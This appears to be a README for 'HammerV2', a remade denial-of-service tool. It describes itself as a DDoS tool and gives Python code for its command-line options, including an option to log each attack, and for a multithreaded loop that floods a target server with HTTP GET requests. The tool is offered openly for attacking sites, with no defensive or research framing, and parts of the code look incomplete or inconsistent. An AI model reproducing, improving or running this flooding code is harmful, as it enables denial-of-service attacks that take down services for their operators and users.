# HammerV2
- HammerV2 is some DDoS tool that has been remaked by iFanpS & NumeX

Me & NumeX remake this DDoS tool because the old version has been malfunction or cannot be use.

Me implement some code in here like new argument and on attack line.

# New Argument
I am adding new argument (-l | logs) logs method is used for know when are u ddosing.

I will add new argument soon like can automatically make logs when the site u ddos is Down.
```Python
def get_parameters():
    global host
    global port
    global thr
    global item
    times = time.ctime(time.time()).split()
    optp = OptionParser(add_help_option=False,epilog="Hammers")
    optp.add_option("-l","--logs",dest="logs",help="save attack logs -l yes")
    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
    optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
    optp.add_option("-t","--thread",type="int",dest="turbo",help="default 1000 thread")
    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.logs == 'yes':
        with open('logs_hammerv2.txt','a') as lg:
            lg.write(f"{host}:{port} is attacked on Day : {times[0]}, Month : {times[1]}:{times[2]}, Time : {times[3]}, Year : {times[4]}\n")
            lg.close()
    else:
        pass
    if opts.turbo is None:
        thr = 1000
    else:
        thr = opts.turbo
```

# Attack Method
The old hammer attack method u can find on github.

But here i remake the attack method to fast attack.
```Python
def down_it():
    try:
        data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive"""
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((prox[0],int(prox[1])))
            if s.sendto( packet, (host, int(port))):
                s.shutdown(1)
                print ("\033[94m <--packet sent to {0}:{1}! hammering--> \033[0m".format(host, int(port)))
            else:
                s.shutdown(1)
                print("\033[91m shut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91m Socket error, Error {0}\033[0m".format(e))
        time.sleep(2)
    except KeyboardInterrupt:
        exit()
```

# Credit
- NumexX & iFanpS
